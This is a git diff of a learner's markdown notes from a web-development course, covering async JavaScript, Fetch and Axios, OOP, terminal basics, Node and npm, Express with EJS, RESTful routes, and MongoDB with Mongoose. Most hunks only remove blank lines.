 - ex. function colorize() {
         this.style.backgroundColor = makeRandColor();
         this.style.color = makeRandColor()
@@ -3791,11 +3473,7 @@ ex. firstLi.remove()
 
 <br>
 
-
-
-
 #### 261. Keyboard Events & Event Objects
-
 1. Event Objects
 - ex. document.querySelector('button').addEventListener('click', function (evt) {
         console.log(evt)
@@ -3839,19 +3517,15 @@ ex. firstLi.remove()
   ~> 'input': happens everytime the input changes
   ~> can be useful for preview & whatnot!
 
-
 <br>
 
-
 #### 264. Event Bubbling
-
 - all the events bubbled up by elements will run
   ~> to stop the execution of further events, .stopPropagation()
 
 <br>
 
 #### 265. Event Delegation
-
 - example file - deleting list items using
   for (li in lis) {
     li.eventListener('click',function(e){
@@ -3871,10 +3545,6 @@ ex. firstLi.remove()
 
 <br>
 
-
-
-
-
 ## 26. Score Keeper CodeAlong
 #### 266. Score Keeper
 - "Bulma": similar to Bootstrap, another CSS framework
@@ -3889,13 +3559,7 @@ ex. firstLi.remove()
 
 <br>
 
-
-
 ## 27. Async JavaScript: Oh Boy!
-
-
-
-
 #### 270. What Matters In This Section
 - Crucial
 : Working With Promises
@@ -3947,9 +3611,6 @@ ex. firstLi.remove()
      "I am the end of the file!" => the browser (C++) sets the timer and tells  JS to 
      "Here is your data from the server.."
 
-
-
-
 - The **browser** does the work! (not JS)
 : Browsers come with Web APIs that are able to handle certain tasks in the background (like making requests or setTimeout)
 : The JS call stack recognizes these Web API functions and passes them off to the browser to take care of
@@ -3973,7 +3634,6 @@ ex. firstLi.remove()
 <br>
 
 #### 274. Demo: fakeRequest using Callbacks
-
 - Enter Promises
 : A Promise is an object representing the eventual completion or failure of an asynchronous operation
 
@@ -4018,7 +3678,6 @@ ex. firstLi.remove()
 - Fulfill / Reject
   : A promise is a returned object to which you attach callbacks, instead of passing callbacks into a function
 
-
 - NOTE. if 'fulfill'd, use *then*
   NOTE. if 'reject'ed, use *catch*
 
@@ -4030,9 +3689,6 @@ ex. firstLi.remove()
             console.log("Promise Rejected!");
             console.log("Oh No, Error!!!");
         })
-
-      
-
 
 - when there become multiple levels of promise requests...
   ex. fakeRequestPromise('yelp.com/api/coffee/page1')
@@ -4100,7 +3756,6 @@ ex. firstLi.remove()
   : Promise Object always takes **two parameters!**
   : one for fullfillment, and the other for failure cases
 
-
 - ex. const fakeRequest = (url) => {
           return new Promise((resolve, reject) => {
               const rand = Math.random();
@@ -4124,7 +3779,6 @@ ex. firstLi.remove()
 
 - ex. color change codes using (1) Callback and (2) Promise
 
-
 <br>
 
 #### 278. Async Keyword
@@ -4139,11 +3793,9 @@ ex. firstLi.remove()
 - Becuase these two simplify codes a lot, we will use these further along
 - While *understanding* Promises is crucial too!
 
-
 - The async keyword
 : Async functions always return a promise
 : If the function returns a value, the promise will be resolved with that value
-
 
 : If the function throws an exception, the promise will be rejected
 
@@ -4161,7 +3813,6 @@ ex. async function hello() {
 ex. const sing = async () => {
     }
     ~> <pending> promise returned
-
 
 ex. const login = async (username, password) => {
       //if missing any of them
@@ -4183,17 +3834,11 @@ ex. const login = async (username, password) => {
 
     ~> "LOGGED IN!" \n "welcome!"
 
-
-
-
 <br>
 
 #### 279. The Await Keyword
 - The await keyword
-
   : await will pause the execution of the function, waiting for a promise to be resolved
-
-
 - ex. for the color change function,
 
   ex. async function rainbow(){
@@ -4211,8 +3856,6 @@ ex. const login = async (username, password) => {
       }
 
       printRainbow()
-
-
 
 - very very common pattern!
   ex. async function makeTwoRequests() {
@@ -4235,20 +3878,10 @@ ex. const login = async (username, password) => {
       } 
       }
 
-
 <br>
 
 ## 28. AJAX and APIs
 #### 281. What Matters In This Section
-
-
-
-
-
-
-
-
-
 - Crucial
 : Working With API's
 : Intro to JSON
@@ -4262,7 +3895,6 @@ ex. const login = async (username, password) => {
 : Making XHRs
 
 <br>
-
 
 #### 282. Intro to AJAX
 - AJAX
@@ -4300,29 +3932,16 @@ ex. const login = async (username, password) => {
 
   ~> returns JSON
 
-
 - vs. when you take info from a page using 'source' you also get tons of html & css, which you have to filter
 - API comes in handy, when you only need the data
 
-
-
-
-
 <br>
-
-
-
-
-
-
 
 #### 284. WTF is JSON
 - XML: Extensible Markup Language
   : used to be dominant!
 
-
 - So these days, we can say "AJAJ"
-
 
 - JSON
 : Java
@@ -4354,8 +3973,6 @@ ex. JSON.parse(data).ticker.price
 => JSON.stringfy
 
 ex. const dog = {breed:'lab', color: 'black', owner: undefined}
-
-
 
 ex. JSON.stringfy(dog)
     ~> {"breed": "lab","color":"black"}
@@ -4403,15 +4020,12 @@ ex. 405 Not Allowed (POST request is not supported by this server)
 
 - header contains a bunch of information
 
-
 - TV Show API
 : https://www.tvmaze.com/api
 
 <br>
 
 #### 286. Query Strings & Headers
-
-
 - ":" means a variable! ex. /search/shows?q=:query
 - "?q=:query" ~> an example of **query strings**
 ~> a way of providing additional information
@@ -4424,7 +4038,6 @@ ex. 405 Not Allowed (POST request is not supported by this server)
 <br>
 
 #### 287. Making XHR's
-
 - Old way of setting a Request
 ~> XMLHttpRequest
 : the "original" way of sending requests via JS
@@ -4457,9 +4070,6 @@ ex. const myReq = new XHLHttpRequest(); //New Request Object
 <br>
 
 #### 288. The Fetch API
-
-
-
 - Fetch API
 : A newer way of making a HTTP request using JS
 : Support promises!
@@ -4487,7 +4097,6 @@ ex. fetch('https://api.cryptonator.com/api/ticker/btc-used')
 
 - Still could be confusing! with lots of work
 ~> library like Axios comes in handy
-
 
 - ex. const fetchBitcoinPrice = async() => {
           const res = await fetch('https://api.cryptonator.com/api/ticker/btc-usd')
@@ -4520,9 +4129,7 @@ ex. axios.get('https://api.cryptonator.com/api/ticker/bcn-usd')
         console.log(res.data.ticker.price)
     })
 
-    
 <br>
-
 
 #### 290. Setting Headers With Axios
 - Recall. the dad joke site! ~> if you just fetch using the entire url, you get html with too much information
@@ -4541,12 +4148,7 @@ ex. const getDadJoke = async () => {
 - TV Maze endpoint 
 - Reference
 
-
 <br>
-
-
-
-
 
 ## 29. Prototypes, Classes, & OOP
 #### 292. What Matters In This Section
@@ -4589,7 +4191,6 @@ ex. String.prototype.grumpus = () => alert("go away!")
       return "Sorry I want that element, I will never pop it off!"
     }
 
-
 - Overriding a prototype method is also possible
 
 - Note.
@@ -4598,18 +4199,14 @@ ex. String.prototype.grumpus = () => alert("go away!")
 
 <br>
 
-
 #### 294. Intro to Object Oriented Programming
 - "Organizing" our codes! ~> is the key
 
 <br>
 
-
 #### 295. Factory Functions
-
 - ex. function hex(r,g,b){}
 ~> converts the rgb color into the hex color
-
 
 - Factory Function: to make an object that automatically has the specified methods and stores variable values as properties on that object
 
@@ -4658,7 +4255,6 @@ ex. "hi".slice === "hello".slice ~> true!!
 - Constructor Function
 : cf. *new operator* ~> lets developers create an instance of a user-defined object type / an instance of a built-in object type that has a constructor function
 
-
 ex. function Color(r, g, b) { //capitalized to show that it isn't a regular function
         this.r = r;
         this.g = g;
@@ -4673,7 +4269,6 @@ ex. new Color(255, 40 , 100)
 ~> without the *new* keyword, *this* would refer to the window object
 ~> with the *new* keyword though, it behaves differently! creates an object and links to another
 
-
 - to define methods to the prototype, not each object,
 ~> define outside that constructor
 
@@ -4686,9 +4281,7 @@ ex. color1.hex() ~> color1 (on the left side of hex())will be the value of *this
 
 - NOTE: you do **not** want to use **arrow function** for this, as this keyword behaves differently.
 
-
 <br>
-
 
 #### 297. JavaScript Class
 - Achieves the same thing as Constructor but has much prettier syntaxes!![Syntatic Sugar]
@@ -4707,16 +4300,11 @@ ex. color1.hex() ~> color1 (on the left side of hex())will be the value of *this
 
 <br>
 
-
-
 #### 298. More Classes Exercise
 - code: color into hsl
 - hsl: hue (0 - 360), saturation (0 - 100%), lightness(0 - 100%)!
 
 <br>
-
-
-
 
 #### 299. Extends and Super Keywords
 - separate class with **constructor**
@@ -4724,8 +4312,6 @@ ex. color1.hex() ~> color1 (on the left side of hex())will be the value of *this
 - ex. class Cat extends Pet {}
 
 - you can override
-
-
 
 - *Super*: References the class that we are extending from
   ex. class Cat extends Pet{
@@ -4739,9 +4325,6 @@ ex. color1.hex() ~> color1 (on the left side of hex())will be the value of *this
 
 ## 30. Mastering The Terminal
 #### 300. What Matters In This Section
-
-
-
 - Crucial!
 : LS
 : CD
@@ -4768,7 +4351,6 @@ ex. color1.hex() ~> color1 (on the left side of hex())will be the value of *this
 
 <br>
 
-
 #### 303. Why Do We Need To Know Terminal Commands?
 - Speed!
 : Develop Faster
@@ -4778,12 +4360,8 @@ ex. color1.hex() ~> color1 (on the left side of hex())will be the value of *this
 : With Great Power...
 : the terminal provides a "mainline" into the heart of our computer, giving us access to areas we normally do not interact with
 
-
 - Tools!
 : Many of the tools we need are installed and used via the command line. We don't have much of a choice!
-
-
-
 
 - Confusing Terminology!
 1. Terminal
@@ -4826,12 +4404,9 @@ ex. color1.hex() ~> color1 (on the left side of hex())will be the value of *this
 
 <br>
 
-
 #### 305. The Basics: LS & PWD
 - Use GIT BASH!
 - home directory
-
-
 
 - LS: list the contents of your current directory
 
@@ -4849,7 +4424,6 @@ ex. color1.hex() ~> color1 (on the left side of hex())will be the value of *this
 <br>
 
 #### 307. Relative VS. Absolute Paths!
-
 - absolute path <= can access from anywhere
 : starts with "\"
 
@@ -4857,7 +4431,6 @@ ex. Relative Path: cd ../../Pets
 ~> go Two levels up then go to the folder Pets!
 
 <br>
-
 
 #### 308. Making Directories
 - mkdir(make directory) will create a new directory or new directories
@@ -4879,7 +4452,6 @@ ex. then q to quit!
 
 <br>
 
-
 #### 310. The Touch Command
 - touch to create a file or multiple files
 : while primary purpose of this is to set the modification and access time of files
@@ -4894,7 +4466,6 @@ ex. then q to quit!
 
 - rmdir: delete a directory, only an empty one!
 - rm -rf: delete a directory even if it is not empty! (r = recursive, f = force)
-
 
 <br>
 
@@ -4951,7 +4522,6 @@ ex. then q to quit!
 : Print
 : Loop
 
-
 - Once Node is installed you can write JS in terminal
 
 - Node JS VS. Client-side JS
@@ -4965,18 +4535,15 @@ ex. document, window ~> not available in node
 ex. global object ~> window in browsers
 ~> global in node
 
-
 ex. setTimeout(()=> console.log("HELLO!"),3000)
 
 <br>
-
 
 #### 317. Running Node Files
 - ex. touch firstScript.js
   ex. and to run, node firstScript.js
 
 <br>
-
 
 #### 318. Process & Argv
 - Node js itself is a big topic, and we are only touch its surface
@@ -5022,7 +4589,6 @@ ex. touch greeter.js
 
 - NOTE. Synchronous vs. Asynchronous
 
-
 : the asynchronous form always takes a completion callback as its last argument. The arguments passed to the completion callback depend on the method, but the first operation was completed successfully, then the first argument will be *null* or *undefined*
 
 : exceptions that occur using synchronous operations are thrown immediately and may be handled using try-catch
@@ -5034,7 +4600,6 @@ ex. touch greeter.js
 ## 32. Exploring Modules AND  The NPM Universe
 #### 320. What Matters In This Section
 - Crucial
-
 : Module.Exports
 : Requiring Modules
 : Using NPM
@@ -5044,16 +4609,10 @@ ex. touch greeter.js
 - Nice To Have
 : The Dad Jokes Package
 : Rainbow Package
-
-
-
-
 : The Figlet Package
 : Franc Package
 
 <br>
-
-
 
 #### 321. Working With module.exports
 - Sharing JS codes b/w the files!
@@ -5107,7 +4666,6 @@ ex. touch greeter.js
 <br>
 
 #### 322. Requiring A Directory
-
 - You can require the entire directory
 
 ex. mkdir shelter
@@ -5130,9 +4688,6 @@ ex. in app.js,
 
 <br>
 
-
-
-
 #### 323. Introducing NPM
 - NPM: Node Package Management
 :  NPM is really two things
@@ -5144,7 +4699,6 @@ ex. in app.js,
 <br>
 
 #### 324. Installing Packages - Jokes & Rainbow
-
 
 - https://www.npmjs.com/package/give-me-a-joke
 
@@ -5159,7 +4713,6 @@ ex. in app.js,
   ex. package-lock.json
       ~> contents of node-modules!
 
-
 - ex. const jokes = require ('give-me-a-joke')
       ~> looks for the package in node-modules!
   
@@ -5170,16 +4723,9 @@ ex. in app.js,
           console.log(joke);
       });
 
-
-  - ex. npm install colors
-
-
-
+- ex. npm install colors
 
 <br>
-
-
-
 
 #### 325. Adding Global Packages
 - https://www.npmjs.com/package/cowsay
@@ -5205,7 +4751,6 @@ ex. in the index.js,
 
 <br>
 
-
 #### 326. The All-Important Package.json
 - Packages have "packages.json" files
 : contains meta-data or information about the project/package
@@ -5223,7 +4768,6 @@ ex. in the index.js,
   ex. npm init
       ~> creation utility for the packages.json
       ~> the easiest way of making the packages.json which conforms to the standard rules!
-
 
 - now if we import packages
   ex. npm i figlet
@@ -5250,23 +4794,14 @@ ex. in the index.js,
   ex. npm install
       => packages.js will be reviewed and dependencies are installed
 
-
 <br>
-
 
 #### 328. Language Guesser!
 - https://github.com/wooorm/franc
-
-
-
 - https://github.com/adlawson/nodejs-langs
-
 - we will use **franc**package to detect the language and return the language codes [ISO], and then **langs**package to convert the language code to the lang names!
 
 <br>
-
-
-
 
 ## 33. Creating Servers with Express
 #### 329. What Matters In This Section
@@ -5277,14 +4812,10 @@ ex. in the index.js,
 : Working With Query Strings
 : What are frameworks?
 
-
 - Important
 : Nodemon
 
 <br>
-
-
-
 
 #### 330. Introducing Express!
 - A node package, just like any other package we have used, except it is also a framework!
@@ -5331,7 +4862,6 @@ ex. in the index.js,
   ex. console.dir(app)
   ~> app object!
 
-
 - ex. app.listen(3000, () => {
           console.log("LISTENING ON PORT 3000")
       })
@@ -5354,7 +4884,6 @@ ex. in the index.js,
 
 - common port numbers: 3000, 8080
 
-
 <br>
 
 #### 322. The Request & Response Objects
@@ -5369,13 +4898,11 @@ ex. in the index.js,
 
 - NOTE. http request: not a JS object, but text information
 ~> Express takes this data and parses it into an object!
-
 : console.dir(req)
 ~> a lot of information in the req!!
 ex. pathname: '/' => URL we are requesting! 
 ex. "localhost:3000/dogs"
 ~> pathname: '/dogs'
-
 
 - **response object** has methods on it
 ~> incl. res.send ([body])
@@ -5403,11 +4930,8 @@ ex. app.use((req, res) => {
 <br>
 
 #### 333. Express Routing Basics
-
 - How we respond with different contents to different requests
-
 - Routing: path the incoming requests and match them to some responses
-
 ex. of paths: /dogs
 
 ex. // /cats => "meow"
@@ -5431,16 +4955,11 @@ ex. // app.get(path,  callback function)
 
         res.send("i dont know that path!')
   })
-
-
 ~> make sure! that is it at the end of the code
-
 
 <br>
 
-
 #### 334. Express Path Parameters
-
 - Patterns!!
 : help better searching
 
@@ -5448,13 +4967,10 @@ ex. // app.get(path,  callback function)
 
 ~> app.get ('/r/:subreddit' , (req, res) => {
       res.send('This is a subreddit!'))
-
   }
   => localhost:3000/r/puppy ~> responds with "This is a subreddit"
 
-
 - and here, :subreddit can be accessed as params through req
-
 : console.log(req.params)
 ~> ex. {subreddit : 'aeriocvladf;k'}
 
@@ -5465,21 +4981,16 @@ ex. // app.get(path,  callback function)
 
 <br>
 
-
-
-
-
 #### 335. Working With Query Strings
 - reminder: query strings are something that comes after the question mark!
 
 - Key-Value Pairs!
 
-
 - the req object has a specific property called query!!!!!
 ex. app.get('/search', (req, res) =>{
         console.log(req.query)
         res.send('HI')
-    
+  
       //const {q} = req.query;
       // res.send(`<h1>Search results for : ${q})
     })
@@ -5489,11 +5000,7 @@ ex. in postman, q = dogs and color = red
 
 <br>
 
-
-
-
 #### 336. Auto-Restart With Nodemon
-
 - could be annoying to restart the server anytime there's a change
 ~> there are several ways to get away with it
 
@@ -5511,7 +5018,6 @@ ex. in postman, q = dogs and color = red
 - Crucial
 : What Is Templating?
 : Configuring Express for EJS
-
 : Passing Data to Templates
 : Serving Static Assets
 : Creating Partials
@@ -5577,10 +5083,6 @@ ex. in postman, q = dogs and color = red
 - when we use view engine, Express assumes that the views(or templates) are stored in the folder called "views"
   ex. mkdir views
 
-
-
-
-
 - now it's the time to make templates!
   ex. touch views/home.ejs
 
@@ -5594,9 +5096,6 @@ ex. in postman, q = dogs and color = red
 
 <br>
 
-
-
-
 #### 340. Setting The Views Directory
 - the minor issue that you may encounter : views folder should be in the same folder you're executing in!
 ex. cd ..
@@ -5609,16 +5108,9 @@ ex. nodemon Templating_Demo/index.js
   ex. app.set('views', path.join(__dirname,'/views'))
       //joining the directory name where index.js is saved and /views
 
-
 - path module: related to directory and file paths! ex. path.join: joins multiple strings to normalize them into a single path
 
 <br>
-
-
-
-
-
-
 
 #### 341. EJS Interpolation Syntax
 - let us learn some basic EJS syntax!
@@ -5627,17 +5119,12 @@ ex. nodemon Templating_Demo/index.js
 
 - NOTE: in VSCode, there is an "EJS Extension"!
 
-
 1. <%= : Outputs the value into the template (HTML escaped!)
 
 ex. in home.ejs,
     <%= 4 + 5 + 1 %> // treated not as HTML, but as js!
 
 <br>
-
-
-
-
 
 #### 342. Passing Data to Templates
 - define a simple route in index.js ('/rand')
@@ -5655,31 +5142,15 @@ ex. in home.ejs,
 - in rand.ejs,
   ex. <%=rand%>
 
-
-
-
-
 <br>
 
-
-
-
-
 #### 343. Subreddit Template Demo
-
 - ex. app.get('/r/:subreddit', (req, res) => {
           const {subreddit} = req.params;
           res.render('subreddit', {subreddit})
       })
 
-
 <br>
-
-
-
-
-
-
 
 #### 344. Conditionals in EJS
 - <% %> : embeds JS code except actually rendering result!
@@ -5691,13 +5162,6 @@ ex. in home.ejs,
 
 <br>
 
-
-
-
-
-
-
-
 #### 345. Loops Using EJS
 - ex. app.get('/cats', (req,res)=> {
           const cats = [
@@ -5706,7 +5170,6 @@ ex. in home.ejs,
 })
 
 <br>
-
 
 #### 346. More Complicated Subreddit Demo
 - data.json
@@ -5721,16 +5184,12 @@ ex. in home.ejs,
 
 <br>
 
-
 #### 347. Serving Static Assets In Express
 - "serving" css, js, html, fonts, etc
 
 - express.static() ~> "middleware"
   app.use(express.static())
   => app.use runs for every single request (get/post/etc.)
-
-
-
 
 - middleware: runs between getting request and outputing response
 - ex. app.use(express.static('public'))
@@ -5739,18 +5198,10 @@ ex. in home.ejs,
   ex. then in subreddit.ejs,
   ex. <link rel = "stylesheet" href = "app.css">
 
-
-
 - though to have access to files wherever, we want to introduce absolute paths!
   ex. app.use(express.static(path.join(__dirname,  'public')))
 
-
-
-
 <br>
-
-
-
 
 #### 348. Bootstrap + Express
 - duplicate Templating_Demo
@@ -5760,7 +5211,6 @@ ex. in home.ejs,
 
 - download Compiled CSS and JS From Bootstrap!
 : then move the files ~~~.min.css/js to the folder we are working in
-
 
 - now in subreddit.ejs,
   <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -5772,15 +5222,9 @@ ex. in home.ejs,
 
 - let's now add the navbar!
 
-
 <br>
 
-
 #### 349. EJS & Partials
-
-
-
-
 - Partials: Sub-templates inside Others!
 
 - Basic Idea
@@ -5794,49 +5238,19 @@ ex. in home.ejs,
 
 <br>
 
-
-
-
-
-
-
 ## 35. Defining RESTful Routes
-
 #### 350. What Matters In This Section 
 - Crucial
 : GET VS. POST Requests
 : Parsing Request Body
-
 : Forms + Express
-
 : Handling Post Requests in Express
-
 
 - Important
 : Method Override
-
 : RESTful Routing
 
-
 <br>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 #### 351. Get Vs. Post Requests
 - Get
@@ -5859,20 +5273,14 @@ ex. in home.ejs,
   </form>
   => in the URL the submitted information is shown
 
-
 - Example of Post
-
 : <form action="/tacos" method = "post">
       <input type="text" name = "meat">
       <input type="number" name="qty">
       <button>Submit</button>
   </form>
 
-
 <br>
-
-
-
 
 #### 352. Defining Express Post Routes
 - let's talk about handling the post requests in Express!
@@ -5883,12 +5291,6 @@ ex. in home.ejs,
 <br>
 
 #### 353. Parsing The Request Body
-
-
-
-
-
-
 - req.body
 : contains key-value pairs of data submitted in the request body. By default, it's undefined, and is populated when you use body-parsing middleware such as body-parser and multer.
 
@@ -5906,7 +5308,7 @@ ex. in home.ejs,
 : ex. const {meat, qty} = req.body
   ex. res.send(`OK, here are your ${qty} ${meat} tacos`)
 
-  <br>
+<br>
 
 #### 354. Intro to REST
 - Representational State Transfer!
@@ -5975,7 +5377,7 @@ ex. in home.ejs,
 
 - in index.js,
   ex. app.use('view engine','ejs')
-  ex. const path = require('path')
+  ex. const path = require('path')  
   ex. app.set('views',path.join(__dirname,"views"))
 
   ex. const comments = [...] //fake comments as an array
@@ -5986,12 +5388,7 @@ ex. in home.ejs,
   })
   ~> here, index is index.ejs
 
-
 <br>
-
-
-
-
 
 #### 357. RESTful Comments New
 - in index.js,
@@ -6000,14 +5397,12 @@ ex. in home.ejs,
       })
 - when ask for new comment form, a form is returned, and new comments in that form are posted
 
-
 - in index.js,
   ex. app.post('/comments',(req, res)=> {
         console.log(req.body)
         //make sure there's something sent
         res.send("IT WORKED!")
   })
-
 
 - and in new.ejs,
   <form action="/comments"method="post">
@@ -6022,18 +5417,14 @@ ex. in home.ejs,
 
 <br>
 
-
 #### 358. Express Redirect
-
 - status codes: 3xx is with redirects!
 
 - default: 302 Found!!
 
-
 - res.redirect('/comments'); //default - get
 
 <br>
-
 
 #### 359. RESTful Comments Show
 - many people call is show / details route : show details on one particular resource !!
@@ -6058,7 +5449,6 @@ ex. in home.ejs,
 
 - ex. npm i uuid 
 
-
 - ex. const {v4: uuidv4} = require('uuid');
   ex. uuidv4(); //from docs
 
@@ -6066,11 +5456,9 @@ ex. in home.ejs,
 
 <br>
 
-
 #### 361. RESTful Comments Update
 - Two HTTP Verbs that can update the contents - PUT and PATCH
 - "PUT": update the whole thing
-
 
 - "PATCH": partially change
   ex. app.patch('/comments/:id', (req, res) => {
@@ -6085,7 +5473,6 @@ ex. in home.ejs,
 
 <br>
 
-
 #### 362. Express Method Override
 - http://expressjs.com/en/resources/middleware/method-override.html
 
@@ -6094,7 +5481,6 @@ ex. in home.ejs,
 - ex. app.get('/comment/:id/edit')
 
 - ex. edit.ejs
-
 
 - ex. npm i method-override 
 : lets you use HTTP verbs such as PUT or DELETE in places where the client doesn't support it
@@ -6108,15 +5494,7 @@ ex. in home.ejs,
   
   ex. <form method="POST" action="/resource?_method=DELETE"></form>
 
-
 <br>
-
-
-
-
-
-
-
 
 #### 363. RESTful Comments Delete
 - you could possibly do it using JS, ex. axios, fetch
@@ -6132,13 +5510,6 @@ ex. in home.ejs,
 
 <br>
 
-
-
-
-
-
-
-
 ## 36. Our First DataBase: MongoDB
 #### 364. What Matters In This Section
 - Crucial
@@ -6149,26 +5520,17 @@ ex. in home.ejs,
 : Mongo Updates
 : Mongo Deletions
 
-
 - Important
 : Databases Basics
 : SQL vs. NoSQL
 
-
-
-
 <br>
-
-
-
-
 
 #### 365. Introduction to Databases
 - What is Mongo?
 : OUR FIRST DATABASE!
 : According to Mongo's homepage, it is "the most popular database for modern applications". It is commonly used in combination with Node.
 : Mongo is a **document database**, which we can use to store and retrieve complex data from.
-
 
 - Why use a Database?
 : Instead of just saving to a file?
@@ -6192,13 +5554,7 @@ vs.
 : MongoDB, Couth DB, Neo4j, Cassandra, Redis
 : very diverse
 
-
-
-
 <br>
-
-
-
 
 #### 367. Why use MongoDB?
 - Why are we learning mongo?
@@ -6208,7 +5564,6 @@ vs.
 : its popularity also means there is a strong community of developers using Mongo
 
 ~> so it's an answer to 'we need some kind of database, so why can't it be something that is popular and compatible with what we have learned so far?'
-
 
 - Still recommend to learn MySQL or Postgres in the next year
 
@@ -6222,18 +5577,11 @@ vs.
 
 <br>
 
-
 #### 369. Installing Mongo:Windows
 - follow the official guide
 ~> https://docs.mongodb.com/manual/tutorial/install-mongodb-on-windows/
 
 <br>
-
-
-
-
-
-
 
 #### 370. The Mongo Shell
 - in terminal, mongo
@@ -6242,7 +5590,6 @@ vs.
 
 - https://zarkom.net/blogs/windows-local-coding-environment-1204
 - https://www.loom.com/share/ec6493fff5b04f2f98ee1f10d00f2334
-
 
 - ">" ~> Mongo shell!
 ~> also a JavaScript shell!(ex.1+2)
@@ -6262,7 +5609,6 @@ vs.
 
 <br>
 
-
 #### 371. What On Earth is BSON?
 - mongodb.com/json-and-bson
 
@@ -6279,7 +5625,6 @@ vs.
 : a binary representation to store data in JSON format optimized for flexibility + speed + space
 
 <br>
-
 
 #### 372. Inserting with Mongo
 - MongoDB - Docs - Server
@@ -6301,7 +5646,6 @@ vs.
 - ex. db.dogs.insertOne({name: "Charlie", age: 3, breed: "corgi", catFriendly: true})
   ex. show collections
 
-
 - here, the object is JS object, not JSON
 
 - ex. db.dogs.find()
@@ -6317,18 +5661,9 @@ vs.
 
 <br>
 
-
-
-
-
-
-
 #### 373. Finding with Mongo
 - db.collections.find()
 ~> will find all the instance in collection
-
-
-
 
 - ex. db.dogs.find({breed: "corgi"})
   ex. db.dogs.findOne({catFriendly: true})
@@ -6336,11 +5671,7 @@ vs.
   ~> db.collections.find() : returns "cursor" (covered later)
   ~> db.collections.findOne() : returns the document
 
-
 <br>
-
-
-
 
 #### 374. Updating with Mongo
 - db.collection.updateOne()
@@ -6348,7 +5679,6 @@ vs.
 - db.collection.updateMany()
   : update all that match
 - db.collection.replaceOne()
-
 
 - when updating with Mongo, gotta use special operators!
 - one of them is the "set"!
@@ -6367,14 +5697,7 @@ vs.
 ~> now you can see "lastChanged" field which shows the ISODate (specific to BSON)
 - ex. db.cats.replaceOne(...) ~> can change everything about the instance except for its id
 
-
-
-
-
 <br>
-
-
-
 
 #### 375. Deleting with Mongo
 - db.collection.deleteMany()
@@ -6384,12 +5707,7 @@ vs.
 
 - ex. db.dogs.deleteMany({})~> delete all in one go!
 
-
 <br>
-
-
-
-
 
 #### 376. Additional Mongo Operators
 - ex. db.dogs.insert([
@@ -6411,7 +5729,6 @@ vs.
   ex. $ne: not equal to
   ex. $or & $and
 
-
   ex. db.dogs.find({age: {$gte: 10}})
   ex. db.dogs.find({breed: {$in: ["Mutt", "Husky"]}})
   ex. db.dogs.find({breed: {$in: ["Mutt", "Husky"], age: {$gt: 12}}})
@@ -6419,16 +5736,12 @@ vs.
 
 <br>
 
-
-
-
 ## 37. Connecting To Mongo With Mongoose
 #### 377. What Matters In This Section
 - Crucial
 : The Roleof ORM / ODM's
 : Connecting Mongoose to Mongo
 : Defining A Model
-
 : Mongoose CRUD
 : Schema Constraints
 
@@ -6441,7 +5754,6 @@ vs.
 
 <br>
 
-
 #### 378. What is Mongoose
 - https://mongoosejs.com/
 
@@ -6450,7 +5762,6 @@ vs.
 ~> for Node.js, we can npm i the required driver to connect Node to Mongo
 
 - however, we will use the tool "MONGOOSE!"
-
 
 - ODM: Object Data Maper?
 : Object Document Mapper?
@@ -6463,10 +5774,6 @@ vs.
 - cf. ORM: Object Relation Mapper ~> used for SQL-based ODMs
 
 <br>
-
-
-
-
 
 #### 379. Connecting Mongoose to Mongo
 - ALWAYS a good idea to have "mongoosejs.com" open while working with it! as syntax can be complex
@@ -6505,26 +5812,16 @@ vs.
           console.log(err)
       })
 
-
-
-
 <br>
-
-
-
-
 
 #### 380. Our First Mongoose Model
 - The Models are JS classes that we make with the assistance of Mongoose, which represent the data in MongoDB
 
 - it helps us interact with the database
 
-- for every single resource or collection we are planning to use in a JS file through Mongoose, we should define a model for each one
+- for every single resource or collection we are planning to use in a JS file through Mongoose, we shou900ld define a model for each one
 
 - With Mongoose, everything is derived from Schema.
-
-
-
 
 - Scheme: schematic / blueprint / gameplan
 : mapping of different collection keys from Mongo to different types in JS
@@ -6542,9 +5839,6 @@ ex. var blogSchema = new mongoose.Schema({
         }
     });
 
-
-
-
 ex. const Movie = mongoose.model('Movie', movieSchema)
 ~> here, 'Movie' is the model name!
 ~> it has to be singular and start with an uppercase letter
@@ -6555,7 +5849,6 @@ ex. const Movie = mongoose.model('Movie', movieSchema)
 ~> now we can make instances of Movie classes and save them on MongoDB
 
 ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating: 'R'})
-
 
 - In Git Bash,
   ex. node
@@ -6569,16 +5862,10 @@ ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating:
   ex. use movieApp
   ex. db.movies.find()
 
-
 - ex. amadeus.score = 9.7 //changing on JS
   ex. amadeus.save() //now saved on MongoDB as well!
 
-
 <br>
-
-
-
-
 
 #### 381. Insert Many
 - Commonly used way
@@ -6603,13 +5890,7 @@ ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating:
         console.log(data);
   })
 
-
-
-
-
 <br>
-
-
 
 #### 382. Finding with Mongoose
 - Model.find()
@@ -6645,18 +5926,10 @@ ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating:
 - .exec() method
   => gives us a full PROMISE (not QUERY, the thenable object)
 
-
-
-
-
 - .findById(id) ~>very commonly used! Especially in an Express app
   ex. app.get('movies/:id') and just can use that id to find the matching data in the database
 
 <br>
-
-
-
-
 
 #### 383. Updating With Mongoose
 - ex. Model.updateMany()
@@ -6675,25 +5948,17 @@ ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating:
 - ex. in node,
   ex. Movie.updateMany({title: {$in:['Amadeus', 'blah' ]}}, {score: 10.0}).then(res => console.log(res))
 
-
 - ex. Model.findOneAndUpdate()
   ~> finds the object and update and gives us back the original object! (but with {new: true}, it returns the updated one)
 
   ex. Movie.findOneAndUpdate({title: 'blah'}, {score: 7.00}, {new: true}).then(m => consoel.log(m))
-
 
 - ALWAYS be careful of DEPRECATION warnings!
 : Solutions - https://mongoosejs.com/docs/deprecations.html
 
 <br>
 
-
-
-
-
 #### 384. Deleting With Mongoose!
-
-
 - ex. .remove() ~> does not give us back any documents that were invovled 
 
 - but
@@ -6701,17 +5966,12 @@ ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating:
   ex. .findByIdAndRemove()
   give back the object ~> depends on the use!
 
-
 - in node,
   ex. Movie.remove({title: 'blah'}).then(msg => console.log(msg))
   ex. Movie.deleteMany({year: {$gte: 1999}}).then(msg => console.log(msg))
   ex. Model.findOneAndDelete({title: 'blah'}).then(m => console.log (m))
-*0
+
